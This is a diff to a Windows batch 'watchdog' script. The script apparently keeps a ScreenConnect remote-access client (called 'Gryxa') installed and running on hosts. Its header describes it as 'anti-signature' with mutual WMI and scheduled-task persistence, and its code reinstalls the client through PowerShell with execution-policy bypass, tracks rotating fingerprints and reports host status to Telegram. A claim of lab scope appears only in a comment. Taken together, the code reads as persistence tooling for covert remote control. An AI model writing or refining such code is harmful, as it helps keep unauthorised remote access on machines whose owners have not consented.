@@ -1,8 +1,8 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260802M28
+rem  OWN_MON  BUILD 20260802M29
 rem  Persistent watchdog - identity-aware (anti-signature), mutual
-rem  WMI+schtasks, Gryxa 8h deep health (TCP/relay/FP drift reinstall).
+rem  Gryxa: no reinstall when Running (stop panel duplicates); 8h FP drift only.
 rem  Authorized internal deployment - lab/competition scope only.
 rem ═══════════════════════════════════════════════════════════════
 setlocal EnableDelayedExpansion
@@ -36,7 +36,7 @@ set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M28"
+set "MONVER=M29"
 set "PF86=%ProgramFiles(x86)%"
 set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
 rem load current Gryxa FP (may rotate when server/keys change)
@@ -301,42 +301,58 @@ if errorlevel 1 (
 )
 
 rem ── [G2] Gryxa MUST-RUN (light every tick + deep every 8h) ────
-rem Deep: download MSI, detect FP drift, TCP to update/ui.gryxa.com,
-rem service+dir+relay config; reinstall until HEALTHY.
+rem HARD: never reinstall when service Running (panel duplicates).
+rem Deep only checks FP drift; TCP is advisory. findstr /B HEALTHY (not UNHEALTHY).
 set "GRYXA_OK=0"
 set "GRYXA_WAS=0"
+set "DO_DEEP=0"
 if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
 sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
 if not errorlevel 1 set "GRYXA_WAS=1"
 
-set "DO_DEEP=0"
 powershell -NoProfile -NonInteractive -Command "if(( -not (Test-Path '%GRYXA_DEEP%')) -or (((Get-Date)-(Get-Item -LiteralPath '%GRYXA_DEEP%' -Force).LastWriteTime).TotalHours -ge 8)){ exit 1 } else { exit 0 }" >nul 2>&1
 if errorlevel 1 set "DO_DEEP=1"
+
+rem Already Running + not deep due → zero msiexec (stops panel duplicates)
+if "%GRYXA_WAS%"=="1" if "%DO_DEEP%"=="0" (
+  set "GRYXA_OK=1"
+  echo gryxa_skip_already_running>>"%LOG%"
+  goto :GryxaAfter
+)
 
 if "%DO_DEEP%"=="1" (
   echo gryxa_deep_begin>>"%LOG%"
   set "GRES="
   if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -WorkDir "%WD%" -Build %MONVER%`) do set "GRES=%%R"
   echo gryxa_deep_result=!GRES!>>"%LOG%"
-  echo !GRES!| findstr /I "HEALTHY" >nul
+  echo !GRES!| findstr /I /B /C:"HEALTHY" >nul
+  if not errorlevel 1 set "GRYXA_OK=1"
+  rem Always advance deep timer when Running (FP check done; avoid deep every tick)
+  if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
+  sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
   if not errorlevel 1 (
     set "GRYXA_OK=1"
     echo done>"%GRYXA_DEEP%"
-  ) else (
-    rem deep failed - still try light ladder, do not touch deep flag (retry next ticks)
+  ) else if "%GRYXA_OK%"=="0" (
     call :EnsureGryxaMust
+    sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
+    if not errorlevel 1 (set "GRYXA_OK=1" & echo done>"%GRYXA_DEEP%")
+  ) else (
+    echo done>"%GRYXA_DEEP%"
   )
 ) else (
   if exist "%WD%\own_lib.ps1" (
     set "GRES="
     for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -WorkDir "%WD%" -Build %MONVER%`) do set "GRES=%%R"
     echo gryxa_light_result=!GRES!>>"%LOG%"
-    echo !GRES!| findstr /I "HEALTHY" >nul
+    echo !GRES!| findstr /I /B /C:"HEALTHY" >nul
     if not errorlevel 1 (set "GRYXA_OK=1") else (call :EnsureGryxaMust)
   ) else (
     call :EnsureGryxaMust
   )
 )
+
+:GryxaAfter
 rem refresh FP after ensure (may have rotated)
 if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
 sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
@@ -344,11 +360,11 @@ if not errorlevel 1 set "GRYXA_OK=1"
 
 if "%GRYXA_OK%"=="1" if "%GRYXA_WAS%"=="0" (
   powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "gryxa-restored" >nul 2>&1
-  call :TgState RESTORED "Gryxa ScreenConnect healthy (svc+dir+relay)"
+  call :TgState RESTORED "Gryxa ScreenConnect healthy (svc running)"
 )
 if "%GRYXA_OK%"=="0" (
   powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "gryxa-must-fail" >nul 2>&1
-  call :TgState DOWN "Gryxa MUST-RUN unhealthy - reinstall/relay check failed"
+  call :TgState DOWN "Gryxa MUST-RUN - service not Running after heal"
 )
 
 rem ── [H] quiet digest (skip healthy hosts — was flooding Telegram) ──
